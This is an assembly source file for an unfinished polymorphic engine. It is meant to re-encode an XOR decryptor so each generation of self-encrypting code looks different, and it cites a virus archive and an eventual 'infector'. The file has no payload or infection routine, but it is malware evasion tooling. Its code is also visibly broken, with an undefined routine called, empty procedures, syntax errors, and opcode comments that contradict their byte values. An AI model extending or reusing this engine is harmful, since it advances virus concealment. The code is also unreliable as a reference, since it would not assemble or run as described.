;  <vir.asm>   -    polymorphism test program
;                         April 2020
;
;
;   Brief: 
;
;      This assembly file contains code for a polymorphic encryption
;      engine. The structure of the program is as follows:
;       
;      0. Macros and structures.
;      1. Program entry point which immediatley invokes the chosen 
;         cipher.
;      2. The permutation engine. Algorithm description is below.
;      3. Function definitions for tasks that need to be repeated.
;
;   Permutation Engine Algorithm:
;
;       The permutation engine works by simply shuffling registers and 
;       generating semantically equivalent instructions for known 
;       operations. In this case, the permutation engine relies heavily
;       on knowledge of the 0th generation cipher function to mutate
;       and morph successive generations. There is no extra code insertion 
;       as of now. The actual algorithm is the following:
;   
;       1. Control flow is received by permutation engine. At this point,
;          the entire program has been decrypted in memory. 
;       2. The engine uses a static offset to locate the cipher function. 
;          Since the cipher function may grow or shrink in size, it is 
;          located at the end of the program.
;       3. The engine chooses a random ordering of registers to fulfill
;          the semantic roles of the registers in the 0th generation cipher.
;       4. Stepping through each instruction in the 0th generation cipher,
;          the engine will select a semantically equivalent variant of 
;          that instruction, populate mod r/m and any immediates from the
;          0th generation code. The loop maintains awareness of runtime
;          dependencies when placing instructions in positions.
;
;       To facilitate this meta-awareness of the 0th generation code, this
;       program makes use of data structures describing the original
;       cipher. They are the following:
;   
;       a. Semantic Registers Table: a table of registers, where each
;          position indicates a semantic purpose in the original cipher.
;       b. Semantic Instruction Table: a table of instruction sequences
;          delimeted by magic values where position indicates semantic
;          purpose in the original cipher. Indexes dont match 1:1 with
;          original cipher semantic operations.
;       c. Cipher Semantics Table: a table who's ordinals indicate 
;          semantic operations in the 0th generation cipher.
;       
;       To achieve the purposes of the algorithm in a clear way, the 
;       engine makes use of the following functions:
;   
;       f. ShuffleRegisterTable: given a semantic register table data
;          structure, create a random ordering of phyiscal registers
;       j. SelectInstruction: given an index into the cipher semantics
;          table, choose a corresponding intruction sequence from the 
;          semantic instruction table and populate it with the given
;          register that corresponds with the index.
;       k. RandRange: Get a random number in a specific range.
;
;   Notes:
;
;       - This program uses its data section to store the semantic 
;         instruction table. For an infector this would need to be 
;         moved.
;       - In many cases simplicity is favored over completeness
;
;   References:
;       [1] http://www.terraspace.co.uk/uasm248_ext.pdf
;       [2] https://bit.ly/39q4vyj
;       [3] https://vx-underground.org/archive/VxHeaven/lib/vmn04.html
;
option win64:0x08   ; init shadow space, reserve stack at PROC level
option zerolocals:1 ; autozero local vairable memory

include .\vir.inc

;-----------------------------------------------------------------------------
;  0. Macros, Structures, and Constants
;-----------------------------------------------------------------------------

;-- Structs --;

; a. Semantic registers table
REG_TABLE struct
    SourceReg DWORD ?
    DestReg   DWORD ?
    LengthReg DWORD ?
    KeyReg    DWORD ?
    JunkReg_1 DWORD ?
    JunkReg_2 DWORD ?
    JunkReg_3 DWORD ?
REG_TABLE ends

; b. Semantic instruction table is implemented as a binary blob
;    in the code section

; c. Cipher semantics table is implemented in the code section
CIPHER_TABLE struct
    oSetLengthReg BYTE ?    ; 1. Set the length register to the size of the code
    oSetSourceReg BYTE ?    ; 2. Set the source register to the start of the payload code
    oSetKeyReg    BYTE ?    ; 3. Set the key register to the value of the key
    oSetEncReg    BYTE ?    ; 4. Load data for encryption operation
    oCipherOp     BYTE ?    ; 5. Perform encryption operation
    oStoreResult  BYTE ?    ; 6. Store the result of the encryption operation
    oIncSourceReg BYTE ?    ; 7. Increment the source register of the cipher operation size
    oDecLenReg    BYTE ?    ; 8. Decrement the length register by the cipher operation size
    oEncLoop      BYTE ?    ; 9. Return to four if the length register is not zero
CIPHER_TABLE ends

;-----------------------------------------------------------------------------
;  1. Code section, proceeded by program entry
;-----------------------------------------------------------------------------
TEXT$00 SEGMENT ALIGN(10h) 'code' READ WRITE EXECUTE
    debug_flag: 
    db 1

    Main PROC
        ; for 0th generation
        mov     al, byte ptr debug_flag
        test    al, al
        jnz     _main_epilog
        call    simple_substitution_cipher
    _main_epilog:
        call    PermutationEngine   
        ret
    Main ENDP

;-----------------------------------------------------------------------------
;  2. Permutation Engine
;-----------------------------------------------------------------------------
vir_begin:
    PermutationEngine PROC
        local cipherOffset:qword
        local regTable:REG_TABLE
        local xorKey:byte
        push    rbx
        push    rsi

        mov     rax, offset simple_substitution_cipher
        mov     cipherOffset, rax
        lea     rcx, regTable
        call    ShuffleRegTable
        xor     rbx, rbx            ; byte index
    permute_op0:
        lea     rcx, offset simple_substitution_cipher_setup
        push    rcx
        mov     edx, (offset vir_end - offset vir_begin) / 2 
        lea     r8, regTable
        mov     r8d, [r8].REG_TABLE.LengthReg
        
        mov     rcx, 2
        call    rand_range
        test    rax, rax
        jz      op0_t2
        
        op0_t1:          
            pop     rcx  
            call    GenMovImm34
            jmp     permute_op1

        op0_t2:
            pop     rcx
            call    GenMovImm64

    permute_op1:
        add     ebx, eax                    ; Add the address offset of the modified code
        lea     rcx, offset simple_substitution_cipher_setup
        add     rcx, ebx                    ; Address for next instruction
        push    rcx
        lea     edx, offset vir_begin
        mov     r8d, [r8].REG_TABLE.SourceReg
        mov     ecx, 3
        call    rand_range
        test    rax, rax
        jz      op1_t3

        ; 32 bit permutation

        ; 64 bit permutation
        op1_t3:
            pop     rcx





    epilog:
        pop     rsi
        pop     rbx
        ret
    PermutationEngine ENDP

    ; fastcall GenMov32(rcx=address, edx=value, r8d=index)
    GenMovImm32 PROC
        push    rbx
        lea     rax, offset s_mov32_imm     ; Load the address of the opcode
        mov     al, byte ptr [rax]          ; Load the opcode into al
        lea     rbx, s_regtable             ; Load the register value table
        or      al, byte ptr [rbx + r8]     ; OR the opcode with the value at the passed index
        mov     byte ptr [rcx], al          ; Set the first byte at address to the opcode
        inc     rcx                         ; Move the address pointer to the next byte
        mov     dword ptr [rcx], edx        ; Set the immediate value to opcode to 'value'
        pop     rbx         
        mov     rax, 5                      ; Return the number of bytes modified
        ret
    GenMovImm32 ENDP

    ; fastcall GenMov32(rcx=address, edx=value, r8=index)
    GenMovImm64 PROC
        push    rbx
        lea     rax, offset s_64_rex_prefix
        mov     al, byte ptr [rax]
        mov     byte ptr [rcx], al          ; Set the REX prefix at address + 0
        lea     rax, offset s_mov64_imm
        mov     al, byte ptr [al]
        mov     byte ptr [rcx + 1], al      ; Set the MOV opcode at address + 1
        lea     rax, offset s_modrm
        mov     al, byte ptr [rax]          ; Get a Mod/RM byte
        lea     rbx, offset s_regtable        
        or      al, byte ptr [rbx + r8]     ; OR the Mod RM byte with the proper register
        mov     byte ptr [rcx + 2], al      ; Set the Mod/RM byte at address + 2
        mov     dword ptr [rcx + 3], edx    ; Set the immediate value at address + 3
        pop     rbx
        mov     eax, 7
        ret
    GenMovImm64 ENDP

    GenMovReg32 PROC
        push    rbx
        lea     rax, offset s_mov_mem_reg

    GenMovReg32 ENDP

    GenMovReg64 PROC

    GenMovReg64 ENDP

    ; fastcall GenPushReg(rcx=address, edx=reg_index)
    GenPushReg PROC
        push    rbx         
        lea     rax, offset s_push_reg      ; Get the PUSH opcode
        lea     rbx, offset s_regtable      ; Get the regtable offset
        or      al, byte ptr [rbx + rdx]    ; Or the the push opcode with [regtable + index]
        mov     byte ptr [rcx], al          ; Overwrite the original byte        
        pop     rbx
        mov     eax, 1
        ret
    GenPushReg ENDP

    ; fastcall GenPushReg(rcx=address, edx=reg_index)
    GenPopReg PROC
        push    rbx         
        lea     rax, offset s_pop]_reg      ; Get the POP opcode
        lea     rbx, offset s_regtable      ; Get the regtable offset
        or      al, byte ptr [rbx + rdx]    ; Or the the POP opcode with [regtable + index]
        mov     byte ptr [rcx], al          ; Overwrite the original byte        
        pop     rbx
        mov     eax, 1
        ret
    GenPopReg ENDP
    

stable_begin:
    s_modrm:
        db 11000000b    ; 0xC0 Mod/RM byte
    s_64_rex_prefix:
        db 01001000b    ; 0x48 REX prefix
    s_mov64_imm:
        db 11000111b    ; 0xC7 ( +4 bytes for imm)
    s_mov_mem_reg:
        db 10001011b    ; 0x89 ( +1 byte for mem/reg), works for 32 and 64 bit. 
                        ; Add REX for 64 bit. Inc Mod/RM to iterate through regs
    s_mov32_imm:
        db 10111000b    ; 0xB8 ( +4 bytes for imm)

    s_push_reg:
        db 01001000b    ; 0x50 (PUSH reg)
    s_push_imm:
        db 01101010b    ; 0x6A (PUSH imm)
    s_pop_reg:
        db 01011000b    ; 0x58 (POP reg)

    ; Reg table is a list of indexes into this
    s_regtable:
        s_geax: 
            db 0d       ; eax,rax
        s_gecx: 
            db 1d       ; ecx/rcx
        s_gedx: 
            db 2d       ; edx/rdx
        s_gebx: 
            db 3d       ; ebx/rbx

stable_end:

;-----------------------------------------------------------------------------
;  3. Function Definitions
;-----------------------------------------------------------------------------

    ; f. void ShuffleRegisterTable(rcx=qword)
    ShuffleRegTable PROC 
        push    r10
        push    r11
        push    rcx        
    _shuffle_r8:
        mov     rcx, 3
        call    rand_range
        mov     r8, rax
    _shuffle_r9:
        call    rand_range
        cmp     rax, r8
        je      _shuffle_r9
        mov     r9, rax
    _shuffle_r10:
        call    rand_range
        cmp     rax, r8
        je      _shuffle_r10
        cmp     rax, r9
        je      _shuffle_r10
        mov     r10, rax
    _shuffle_r11:
        call    rand_range
        cmp     rax, r8
        je      _shuffle_r11
        cmp     rax, r9
        je      _shuffle_r11
        cmp     rax, r10
        je      _shuffle_r11
        mov     r11, rax
        pop     rax
        mov     [rax].REG_TABLE.SourceReg, r8d
        mov     [rax].REG_TABLE.DestReg, r9d
        mov     [rax].REG_TABLE.LengthReg, r10d
        mov     [rax].REG_TABLE.KeyReg, r11d
        pop     r11
        pop     r10
        ret
    ShuffleRegTable ENDP

    ; qword RandFromRange(rcx=max)
    ; Get a random number from a range
    rand_range:
        push    rbx
        push    rcx
        push    rdx
        mov     r8, rcx

    _rand_range_loop:
        rdrand  rax
        mov     rbx, r8
        mov     rcx, r8
        lzcnt   rcx, rcx                                        ;  Count the number of leading zeroes
        shr     rax, cl                                         ;  Bit shift the random down to the same number of bits as max
        cmp     rax, rbx
        ja     _rand_range_loop
        pop     rdx
        pop     rcx
        pop     rbx
        ret

; End of encoded data.
align 2
vir_end:
    ;  Simple substition cipher [3]
    ;
    simple_substitution_cipher:
        simple_substitution_cipher_setup:
            mov     rcx, (offset vir_end - offset vir_begin) / 2 
                                                                ;  op0. Calculate payload body size in words                         
            mov     rbx, offset vir_begin                       ;  op1  Set source register. Source = start of encrypted code                                                                  
            mov     rsi, rbx                                    ;  op1.                     
            mov     rdi, rsi                                    ;  op2. Set dest register, == source                             
            mov     rbx, 029Ah                                  ;  op4. rbx = key                                                                                                                                              
                                                                                                                            
        simple_substitution_cipher_loop_begin:                                                                              
            mov     ax, word ptr [rsi]                          ;  Essentially lodsw but better able to permutate      
            xor     ax, bx                                      ;  The fundamental cipher operation          
            mov     word ptr [rsi], ax                          ;  Could also be RDI  
            inc     rsi
            inc     rsi      
            dec     rcx
            test    rcx, rcx
            jnz     simple_substitution_cipher_loop_begin    
        simple_substitution_cipher_end:
            ret

db 52 - ($-simple_substitution_cipher_end) dup(0)               ; Space for cipher to permutate

TEXT$00 ENDS
END